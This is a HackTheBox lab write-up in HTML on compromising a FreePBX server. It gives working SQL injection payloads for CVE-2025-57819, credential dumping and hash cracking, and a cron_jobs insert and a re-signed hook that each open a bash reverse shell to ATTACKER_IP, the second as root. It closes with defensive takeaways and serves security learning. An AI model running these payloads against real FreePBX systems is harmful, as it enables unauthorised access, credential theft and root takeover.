@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connected Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      connected
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">Connected</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-easy">Easy</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-06-09</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — CentOS 7</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">Apache 2.4.6 + PHP 7.4.16 + FreePBX 16.0.40.7 (Asterisk)</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVEs</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2025-57819 (Endpoint SQLi → RCE) &nbsp;·&nbsp; CVE-2025-61678 (root privesc)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>Connected is a VoIP-themed box (<code>commonName=pbxconnect</code>) built around a <strong>FreePBX</strong> administration panel:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — <code>CVE-2025-57819</code>: an unauthenticated SQL injection in the FreePBX <code>endpoint</code> module's <code>brand</code> parameter. Error-based extraction dumps admin hashes; an <code>INSERT</code> into the <code>cron_jobs</code> table turns SQLi into command execution as <code>asterisk</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — an <code>incrond</code> watch fires <code>sysadmin_manager</code> as root. The <code>adv_recovery</code> module's hook script <em>and</em> its <code>module.sig</code> integrity file are both writable by <code>asterisk</code>, so we sign our own malicious hook and trigger it.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sC -sV -sT -p- 10.129.12.48
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4
+80/tcp  open  http     Apache 2.4.6 (CentOS) PHP/7.4.16
+443/tcp open  ssl/http Apache 2.4.6 (CentOS) PHP/7.4.16</pre>
+    <p>The TLS certificate subject (<code>commonName=pbxconnect</code>) signals the <strong>Sangoma Connect</strong> module is installed. Browsing to <code>http://connected.htb</code> reveals a <strong>FreePBX 16.0.40.7</strong> admin portal at <code>/admin</code>. That version is below the patched <code>16.0.88.19</code>, making it vulnerable to <strong>CVE-2025-57819</strong>.</p>
+
+    <h2>Initial Access — CVE-2025-57819 (Unauthenticated SQLi)</h2>
+    <p>FreePBX's <code>admin/libraries/BMO/Ajax.class.php</code> enforces authentication:</p>
+    <pre>if (!isset($_SESSION['AMP_user'])) {
+    $this->ajaxError(401, 'Not Authenticated');
+}</pre>
+    <p>This protects standard module paths — but the Endpoint Manager registered itself using a <strong>full PHP namespace string</strong>. Passing it as the <code>module</code> GET parameter (with backslashes) resolves through a different class-loading path that <strong>bypasses the auth middleware entirely</strong>. The <code>brand</code> value in the <code>model</code> command is then concatenated into a SQL query with no sanitisation — unauthenticated database read/write:</p>
+    <pre>GET /admin/ajax.php
+  ?module=FreePBX\modules\endpoint\ajax
+  &command=model&template=x&model=model
+  &brand=x'&lt;INJECTION&gt;-- -</pre>
+    <p>A valid <code>Referer: http://connected.htb/admin/config.php</code> header is required to pass an earlier check in <code>ajax.php</code>.</p>
+
+    <h3>Confirming with error-based extraction</h3>
+    <p>An <code>EXTRACTVALUE()</code> payload leaks query output inside an XPATH error message:</p>
+    <pre>curl -s "http://connected.htb/admin/ajax.php?\
+module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model\
+&brand=x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -" \
+  -H "Referer: http://connected.htb/admin/config.php"
+
+{"error":{"message":"XPATH syntax error: '~freepbxuser@localhost~'"}}</pre>
+
+    <h3>Dumping admin credentials</h3>
+    <p>Pull the FreePBX admin users from <code>asterisk.ampusers</code> (note: long values may need <code>SUBSTRING()</code> because EXTRACTVALUE truncates at ~32 chars):</p>
+    <pre>... EXTRACTVALUE(1,CONCAT(0x7e,
+   (SELECT GROUP_CONCAT(username,0x3a,password_sha1) FROM asterisk.ampusers),
+   0x7e))-- -</pre>
+    <p>The admin <code>password_sha1</code> cracks against rockyou (hashcat SHA1 mode):</p>
+    <pre>hashcat -m 100 admin.hash /usr/share/wordlists/rockyou.txt</pre>
+
+    <h2>SQLi → RCE via the cron_jobs table</h2>
+    <p>FreePBX stores scheduled tasks in the MySQL <code>cron_jobs</code> table. When <code>fwconsole job --run</code> fires (every minute via asterisk's crontab), it reads this table and executes rows where <code>class=NULL</code> as raw shell commands. A stacked-query <code>INSERT</code> through the same injection plants a job whose command is a reverse shell — OS command execution as <code>asterisk</code>. Hex-encoding the string values avoids quote-breaking:</p>
+    <pre>cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+def h(s): return "0x" + s.encode().hex()
+
+payload = (
+  f"x';INSERT INTO cron_jobs "
+  f"(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)"
+  f" VALUES ({h('sysadmin')},{h('htb_job')},{h(cmd)},NULL,"
+  f"{h('* * * * *')},30,1,1)-- -"
+)</pre>
+    <p>Deliver the payload through the <code>brand</code> parameter, start a listener, and trigger job execution:</p>
+    <pre>nc -lvnp 4444
+fwconsole job --run asterisk     # (or wait for the schedule to fire)</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">foothold as asterisk</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -lvnp 4444</span></div>
+        <div class="t-out">connect to [ATTACKER_IP] from connected.htb ...</div>
+        <div class="t-success">bash-4.2$ id</div>
+        <div class="t-out">uid=995(asterisk) gid=995(asterisk) groups=995(asterisk)</div>
+      </div>
+    </div>
+
+    <p>Upgrade to a proper TTY and grab the user flag:</p>
+    <pre>script /dev/null -c bash
+# Ctrl+Z
+stty raw -echo; fg
+reset; export TERM=xterm
+cat /home/asterisk/user.txt</pre>
+
+    <h2>Privilege Escalation — incron + a self-signed hook</h2>
+    <p>Enumerating root-owned but writable files, and the incron config, reveals the path:</p>
+    <pre>find / -user root -writable -not -path "/proc/*" 2>/dev/null
+# /var/www/html/admin/modules/adv_recovery/hooks/logrotate   &lt;-- writable
+# /var/www/html/admin/modules/adv_recovery/module.sig        &lt;-- writable
+
+cat /etc/incron.d/*
+# /var/spool/asterisk/incron  IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#</pre>
+
+    <h3>The chain</h3>
+    <pre>asterisk writes a file to /var/spool/asterisk/incron/adv_recovery.logrotate
+   ↓ incrond fires as root:  sysadmin_manager adv_recovery.logrotate
+   ↓ sysadmin_manager validates sha256(hooks/logrotate) against module.sig
+   ↓ ...but we can write BOTH the hook and the signature
+   ↓ sysadmin_manager executes hooks/logrotate as root  →  our shell</pre>
+
+    <p>Append a reverse shell to the hook, then re-sign it by patching the matching hash inside <code>module.sig</code>:</p>
+    <pre>HOOK="/var/www/html/admin/modules/adv_recovery/hooks/logrotate"
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4446 0>&1' >> "$HOOK"
+
+OLD="5f6ee08a7ca8f204dcd1d02e6257f6cc488cbd21b00edf06bed805e77b29db0b"
+NEW=$(sha256sum "$HOOK" | awk '{print $1}')
+SIG="/var/www/html/admin/modules/adv_recovery/module.sig"
+sed -i "s/$OLD/$NEW/" "$SIG"</pre>
+
+    <p>Start a listener and trigger the watch by closing a file in the watched directory:</p>
+    <pre>nc -lvnp 4446
+echo "trigger" > /var/spool/asterisk/incron/adv_recovery.logrotate</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -lvnp 4446</span></div>
+        <div class="t-out">connect to [ATTACKER_IP] from connected.htb ...</div>
+        <div class="t-success"># id</div>
+        <div class="t-success">uid=0(root) gid=0(root) groups=0(root)</div>
+        <div><span class="t-prompt">#</span> <span class="t-cmd">cat /root/root.txt</span></div>
+      </div>
+    </div>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/asterisk/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>CVE-2025-57819: unauthenticated SQLi in FreePBX endpoint <code>brand</code> param</td><td><span class="severity-critical">Critical</span></td><td>DB read + stacked-query write</td></tr>
+        <tr><td>SQL write to <code>cron_jobs</code> → command execution</td><td><span class="severity-critical">Critical</span></td><td>RCE as <code>asterisk</code></td></tr>
+        <tr><td>Weak password hashing (SHA1, unsalted)</td><td><span class="severity-high">High</span></td><td>Admin password cracked from <code>ampusers</code></td></tr>
+        <tr><td>CVE-2025-61678: root <code>incron</code> hook with attacker-writable <code>module.sig</code></td><td><span class="severity-critical">Critical</span></td><td>Privilege escalation to root</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Authentication bypasses are usually architectural.</strong> The SQLi wasn't reachable because someone forgot a password check — it was reachable because a module registered itself on a path the auth middleware never anticipated. Audit what your auth layer actually <em>covers</em>, not just whether it exists.</li>
+      <li><strong>SQLi into metadata tables is RCE.</strong> FreePBX stored OS commands in a DB table and executed them. Treat write access to any scheduling/job table as potential code execution, and use parameterised queries everywhere.</li>
+      <li><strong>An integrity check is worthless if the attacker controls the signature.</strong> The GPG signature in <code>module.sig</code> comes from FreePBX's servers and <em>can't</em> be forged — but <code>sysadmin_manager</code> compared the hook against a SHA-256 hash stored in that same <em>locally-writable</em> file. Control both the hook and the hash and the check gives zero protection. Keep <code>module.sig</code> root-owned and immutable.</li>
+      <li><strong>incron is a high-value target.</strong> A root file-watch daemon acting on attacker-writable inputs (filenames or contents) is a classic privesc primitive — audit it like cron and systemd path units.</li>
+      <li><strong>Salt and use slow hashes.</strong> Unsalted SHA1 in <code>ampusers</code> falls to a wordlist in seconds.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
